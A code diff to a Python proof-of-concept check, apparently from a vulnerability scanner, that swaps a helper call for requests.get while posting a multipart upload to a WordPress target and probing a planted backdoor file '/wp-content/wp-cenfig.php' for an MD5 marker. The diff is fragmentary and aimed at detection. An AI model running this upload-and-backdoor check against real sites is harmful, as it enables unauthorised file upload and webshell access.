@@ -51,12 +51,13 @@ class Poc(ABPoc):
                 Submit
                 ------WebKitFormBoundary1Ja5UxAmMrAAwPGM--
                 '''
-            header="Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1Ja5UxAmMrAAwPGM"
+            header = {
+                "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary1Ja5UxAmMrAAwPGM"
+            }
             uploader_url = '{target}'.format(target=self.target)+payload
             bockdoor_url = '{target}'.format(target=self.target)+'/wp-content/wp-cenfig.php'
-            code, head, res, _, _ = hh.http('-H "%s" -d "%s" "%s"' % (header, data, uploader_url))
-                       
-            if code ==200 and 'c4ca4238a0b923820dcc509a6f75849b' in res:
+            req = requests.get(uploader_url, headers=header, data=data)
+            if req.status_code ==200 and 'c4ca4238a0b923820dcc509a6f75849b' in req.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
 
         except Exception, e:
